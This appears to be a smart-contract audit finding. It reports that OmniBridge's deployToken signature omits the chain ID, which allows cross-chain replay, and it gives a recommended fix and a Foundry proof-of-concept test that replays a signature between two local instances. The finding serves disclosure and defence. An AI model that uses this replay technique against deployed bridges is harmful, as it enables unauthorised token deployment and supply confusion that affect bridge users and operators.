### Title
Missing Chain ID Binding in `deployToken` Signature Enables Cross-Chain Replay — (`evm/src/omni-bridge/contracts/OmniBridge.sol`)

---

### Summary

The `deployToken` function constructs its signed payload without including `omniBridgeChainId`. Because `finTransfer` does include the chain ID but `deployToken` does not, a valid MPC-signed metadata signature for chain A is cryptographically valid on any other OmniBridge instance that shares the same `nearBridgeDerivedAddress`, allowing an attacker to replay it on chain B.

---

### Finding Description

In `deployToken`, the borsh-encoded message that is hashed and verified against the MPC signature is:

```
PayloadType::Metadata | token | name | symbol | decimals
``` [1](#0-0) 

`omniBridgeChainId` is never included. The `MetadataPayload` struct itself carries no chain-scoping field: [2](#0-1) 

By contrast, `finTransfer` explicitly embeds `omniBridgeChainId` twice in its signed payload (for the token chain and the recipient chain): [3](#0-2) 

The only guards inside `deployToken` after signature recovery are:
1. `ECDSA.recover(hashed, signatureData) != nearBridgeDerivedAddress` — identical on all chains sharing the same MPC key.
2. `!isBridgeToken[nearToEthToken[metadata.token]]` — only prevents re-deployment on the **same** chain instance. [4](#0-3) 

There is no nonce, no destination-chain field, and no contract-address binding in the metadata payload. A signature that passes on instance A will pass identically on instance B.

---

### Impact Explanation

Under the standard multi-chain deployment model (Arbitrum, Base, BSC, etc.), all OmniBridge instances share the same `nearBridgeDerivedAddress` (derived from the same NEAR MPC key) while each has a distinct `omniBridgeChainId`. An attacker who observes a legitimate `deployToken` call on chain A can:

1. Replay the identical `(signatureData, metadata)` on chain B.
2. The call succeeds: a new `ERC1967Proxy` is deployed and registered in `nearToEthToken` on chain B.
3. The `nearToEthToken[metadata.token]` mapping on chain B is now set to the attacker-triggered proxy, blocking any future legitimate deployment for that token on chain B (`ERR_TOKEN_EXIST`).
4. If the NEAR side subsequently routes transfers for that token to chain B (which it may, since the token appears deployed), `finTransfer` calls — legitimately signed for chain B — will mint against the replayed proxy, creating a token supply on chain B that NEAR MPC never explicitly authorized for that chain.

This is a chain/domain separation flaw enabling unauthorized token deployment and potential supply-mapping confusion across chains.

---

### Likelihood Explanation

The precondition — multiple OmniBridge instances sharing the same `nearBridgeDerivedAddress` — is the **intended production deployment topology**. The `omniBridgeChainId` field exists precisely to differentiate these instances, but it is not used in the `deployToken` signature. Any publicly observable `deployToken` transaction on one chain is immediately replayable on all others. No privileged access, leaked keys, or MPC collusion is required.

---

### Recommendation

Include `omniBridgeChainId` in the borsh-encoded payload that is signed and verified in `deployToken`, mirroring the pattern already used in `finTransfer`:

```solidity
bytes memory borshEncoded = bytes.concat(
    bytes1(uint8(BridgeTypes.PayloadType.Metadata)),
    bytes1(omniBridgeChainId),          // <-- add this
    Borsh.encodeString(metadata.token),
    Borsh.encodeString(metadata.name),
    Borsh.encodeString(metadata.symbol),
    bytes1(metadata.decimals)
);
```

The NEAR MPC signing logic must be updated in lockstep to include the destination chain ID when producing metadata signatures. The same fix should be applied to the Starknet `deploy_token` and Solana `deploy_token` implementations, which have the same omission. [5](#0-4) [6](#0-5) 

---

### Proof of Concept

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import "forge-std/Test.sol";
import "../src/omni-bridge/contracts/OmniBridge.sol";
import "../src/omni-bridge/contracts/BridgeToken.sol";
import {ERC1967Proxy} from "@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol";

contract ReplayDeployTokenTest is Test {
    OmniBridge bridgeA;
    OmniBridge bridgeB;
    address mpcKey;
    uint256 mpcPrivKey = 0xDEADBEEF; // test key

    function setUp() public {
        mpcKey = vm.addr(mpcPrivKey);

        BridgeToken impl = new BridgeToken();

        // Chain A: omniBridgeChainId = 1
        OmniBridge implA = new OmniBridge();
        ERC1967Proxy proxyA = new ERC1967Proxy(
            address(implA),
            abi.encodeCall(OmniBridge.initialize, (address(impl), mpcKey, 1))
        );
        bridgeA = OmniBridge(address(proxyA));

        // Chain B: omniBridgeChainId = 2, same nearBridgeDerivedAddress
        OmniBridge implB = new OmniBridge();
        ERC1967Proxy proxyB = new ERC1967Proxy(
            address(implB),
            abi.encodeCall(OmniBridge.initialize, (address(impl), mpcKey, 2))
        );
        bridgeB = OmniBridge(address(proxyB));
    }

    function testReplay() public {
        BridgeTypes.MetadataPayload memory meta = BridgeTypes.MetadataPayload({
            token: "wrap.testnet",
            name: "Wrapped NEAR",
            symbol: "wNEAR",
            decimals: 24
        });

        // Build the same payload the contract builds
        bytes memory borshEncoded = bytes.concat(
            bytes1(uint8(BridgeTypes.PayloadType.Metadata)),
            Borsh.encodeString(meta.token),
            Borsh.encodeString(meta.name),
            Borsh.encodeString(meta.symbol),
            bytes1(meta.decimals)
        );
        bytes32 hashed = keccak256(borshEncoded);
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(mpcPrivKey, hashed);
        bytes memory sig = abi.encodePacked(r, s, v);

        // Legitimate call on chain A
        address tokenA = bridgeA.deployToken(sig, meta);
        assertTrue(tokenA != address(0));

        // Replay identical sig+payload on chain B — should revert but does NOT
        address tokenB = bridgeB.deployToken(sig, meta);
        assertTrue(tokenB != address(0), "Replay succeeded on chain B");

        // nearToEthToken is now set on chain B without MPC authorizing chain B
        assertEq(bridgeB.nearToEthToken("wrap.testnet"), tokenB);
    }
}
```

The test demonstrates that the identical `(signatureData, metadata)` pair passes `ECDSA.recover` on both instances because `omniBridgeChainId` is absent from the signed digest, confirming the cross-chain replay.
